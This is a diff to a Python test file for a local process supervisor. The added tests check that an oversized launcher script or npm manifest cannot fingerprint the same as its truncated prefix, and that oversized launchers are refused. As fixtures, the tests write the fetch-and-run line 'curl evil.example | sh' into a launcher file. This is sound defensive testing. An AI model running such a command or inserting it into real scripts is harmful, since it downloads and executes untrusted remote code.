@@ -33,6 +33,7 @@ from lwsm import supervisor as supervisor_module
 from lwsm.ports import PortProbe, PortSnapshot
 from lwsm.supervisor import (
     ENV_ALLOWLIST,
+    MAX_LAUNCHER_BYTES,
     MAX_LOG_BYTES,
     ROTATION_SUFFIX,
     AlreadyRunning,
@@ -331,6 +332,69 @@ def test_an_escaping_symlink_does_not_fingerprint_as_a_missing_launcher(
 
     outside.write_text("#!/bin/sh\ncurl evil.example | sh\n", encoding="utf-8")
     assert launcher_fingerprint(project, argv) != escaping
+
+
+def test_an_oversized_launcher_does_not_fingerprint_as_its_first_megabyte(
+    project: Path,
+) -> None:
+    """Truncating instead of refusing left appended content out of the digest.
+
+    The read stopped at `MAX_LAUNCHER_BYTES`, so a launcher already over the cap
+    hashed identically to one holding only that prefix — and anything appended
+    past it never re-armed the gate ADR-0003 re-arms on a content change
+    (LWSM-1227).
+    """
+    argv = ("./start.sh",)
+    launcher = project / "start.sh"
+    prefix = b"#" * MAX_LAUNCHER_BYTES
+
+    launcher.write_bytes(prefix)
+    launcher.chmod(0o700)
+    capped = launcher_fingerprint(project, argv)
+
+    launcher.write_bytes(prefix + b"\ncurl evil.example | sh\n")
+    assert launcher_fingerprint(project, argv) != capped
+
+
+def test_an_oversized_launcher_is_refused(
+    project: Path, supervisor: Supervisor
+) -> None:
+    """A launcher we cannot hash whole must not run (LWSM-1227)."""
+    launcher = project / "start.sh"
+    launcher.write_bytes(b"#" * (MAX_LAUNCHER_BYTES + 1))
+    launcher.chmod(0o700)
+
+    with pytest.raises(LauncherRefused) as caught:
+        validate_launcher(project, launcher)
+    assert "larger than" in str(caught.value)
+
+    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
+    with pytest.raises(LauncherRefused):
+        supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
+    assert not supervisor.running()
+
+
+def test_an_oversized_manifest_does_not_fingerprint_as_its_prefix(
+    project: Path,
+) -> None:
+    """The npm half needs the same refusal, and JSON does not enforce it.
+
+    A truncated manifest usually fails to parse, which is why this looked
+    covered — but trailing whitespace is legal JSON, so a padded prefix parses
+    and yields the same script a much larger file would. Two different manifests
+    then hash alike, and content past the cap never re-arms the gate
+    (LWSM-1227).
+    """
+    argv = ("npm", "run", "dev")
+    manifest = project / "package.json"
+    head = b'{"scripts": {"dev": "echo one"}}'
+
+    at_cap = head + b" " * (MAX_LAUNCHER_BYTES - len(head))
+    manifest.write_bytes(at_cap)
+    capped = launcher_fingerprint(project, argv)
+
+    manifest.write_bytes(at_cap + b" " * 64)
+    assert launcher_fingerprint(project, argv) != capped
 
 
 @pytest.mark.parametrize("mode", [0o770, 0o707, 0o777])
